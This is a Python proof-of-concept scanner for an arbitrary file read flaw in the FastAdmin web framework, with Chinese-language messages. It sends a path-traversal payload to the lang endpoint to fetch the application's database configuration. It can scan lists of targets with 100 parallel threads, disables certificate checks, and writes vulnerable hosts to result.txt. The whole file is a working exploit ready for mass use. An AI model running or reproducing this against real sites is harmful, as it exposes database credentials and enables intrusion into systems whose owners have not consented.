import requests,re,argparse,os,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = '''
        ███████╗ █████╗ ███████╗████████╗ █████╗ ██████╗ ███╗   ███╗██╗███╗   ██╗
        ██╔════╝██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗████╗ ████║██║████╗  ██║
        █████╗  ███████║███████╗   ██║   ███████║██║  ██║██╔████╔██║██║██╔██╗ ██║
        ██╔══╝  ██╔══██║╚════██║   ██║   ██╔══██║██║  ██║██║╚██╔╝██║██║██║╚██╗██║
        ██║     ██║  ██║███████║   ██║   ██║  ██║██████╔╝██║ ╚═╝ ██║██║██║ ╚████║
        ╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═════╝ ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝
                                                                                
'''
    print(banner)

def main():
    banner()

    parser = argparse.ArgumentParser(description="Fastadmin框架存在任意文件读取漏洞")

    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace("\n",''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag: \n\tpython:{sys.argv[0]} -h")
        
def poc(target):
    payload = "/index/ajax/lang?lang=../../application/database"
    url = target+payload
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "keep-alive",
            }    
    try:
        res = requests.get(url=url,headers=header,verify=False,timeout=10)
        if  '"type":"mysql"' in res.text and res.status_code == 200:
            print(f"[+]此url{target}存在漏洞")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n') 
        else:
            print(f"[-]此url{target}不存在漏洞")
    except Exception as e:
        print(f"[*]此url{target}可能存在访问问题，请手工测试"+e)
if __name__ ==  '__main__':
    main()
